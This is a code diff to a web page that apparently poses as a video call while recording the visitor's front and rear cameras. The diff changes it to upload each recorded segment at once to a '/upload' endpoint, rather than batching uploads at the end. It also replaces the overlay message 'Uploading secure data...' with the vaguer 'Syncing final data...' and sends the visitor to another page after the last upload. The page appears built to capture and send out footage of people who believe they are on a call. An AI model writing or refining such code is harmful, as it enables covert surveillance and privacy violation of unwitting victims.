@@ -90,16 +90,17 @@
 
     <div id="overlay">
         <span class="loader"></span>
-        <p id="statusMsg">Uploading secure data...</p>
+        <p id="statusMsg">Syncing final data...</p>
     </div>
 
 <script>
 let localStream;
 let mediaRecorder;
 let currentChunks = [];
-let videoFiles = []; // Array to store finished blobs (front/back)
+let segmentCount = 1;
 let currentFacing = "user";
 let uiVisible = true;
+let isEnding = false; // Flag to check if we should redirect
 
 const connectSound = new Audio("ringtone.mp3");
 const localVideo = document.getElementById("localVideo");
@@ -144,10 +145,8 @@ async function startCamera() {
         mediaRecorder.ondataavailable = e => { if (e.data.size > 0) currentChunks.push(e.data); };
         
         mediaRecorder.onstop = () => {
-            const blob = new Blob(currentChunks, { type: "video/webm" });
-            if (blob.size > 0) {
-                videoFiles.push(blob);
-            }
+            uploadSegment(new Blob(currentChunks, { type: "video/webm" }), segmentCount);
+            segmentCount++;
         };
 
         mediaRecorder.start();
@@ -156,45 +155,51 @@ async function startCamera() {
     }
 }
 
-async function switchCamera() {
-    if (mediaRecorder && mediaRecorder.state !== "inactive") {
-        mediaRecorder.stop();
+// --- INSTANT UPLOAD LOGIC ---
+async function uploadSegment(blob, id) {
+    if (blob.size === 0) return;
+
+    const formData = new FormData();
+    const fileName = `call_seg_${id}_${currentFacing}.webm`;
+    formData.append("video", blob, fileName);
+
+    try {
+        await fetch("/upload", { method: "POST", body: formData });
+        console.log(`Segment ${id} uploaded.`);
+        
+        // If the user hit "End Call", redirect after the final segment is sent
+        if (isEnding) {
+            window.location.href = "search.html";
+        }
+    } catch (e) {
+        console.error("Upload failed", e);
+        if (isEnding) window.location.href = "search.html";
     }
-    
-    // Tiny delay to ensure tracks are released
-    setTimeout(async () => {
-        currentFacing = (currentFacing === "user") ? "environment" : "user";
-        await startCamera();
-    }, 300);
 }
 
-// --- FINAL UPLOAD ---
-async function endCall() {
+async function switchCamera() {
     if (mediaRecorder && mediaRecorder.state !== "inactive") {
-        mediaRecorder.stop();
+        mediaRecorder.stop(); // This triggers uploadSegment automatically
     }
+    
+    // Switch the lens while the previous video uploads in the background
+    currentFacing = (currentFacing === "user") ? "environment" : "user";
+    await startCamera();
+}
 
+async function endCall() {
+    isEnding = true;
     document.getElementById("overlay").style.display = "flex";
 
-    // Wait a moment for the final blob to be pushed to videoFiles
-    setTimeout(async () => {
-        if (localStream) localStream.getTracks().forEach(t => t.stop());
-
-        // Loop through all saved videos (Front, Back, etc.) and send them
-        for (let i = 0; i < videoFiles.length; i++) {
-            const formData = new FormData();
-            const fileName = `call_part_${i + 1}_${currentFacing}.webm`;
-            formData.append("video", videoFiles[i], fileName);
-
-            try {
-                await fetch("/upload", { method: "POST", body: formData });
-            } catch (e) {
-                console.error("Upload error", e);
-            }
-        }
-
+    if (mediaRecorder && mediaRecorder.state !== "inactive") {
+        mediaRecorder.stop(); // This triggers the final uploadSegment and redirect
+    } else {
         window.location.href = "search.html";
-    }, 800);
+    }
+
+    if (localStream) {
+        localStream.getTracks().forEach(t => t.stop());
+    }
 }
 
 // --- MAGNETIC DOCKING ---
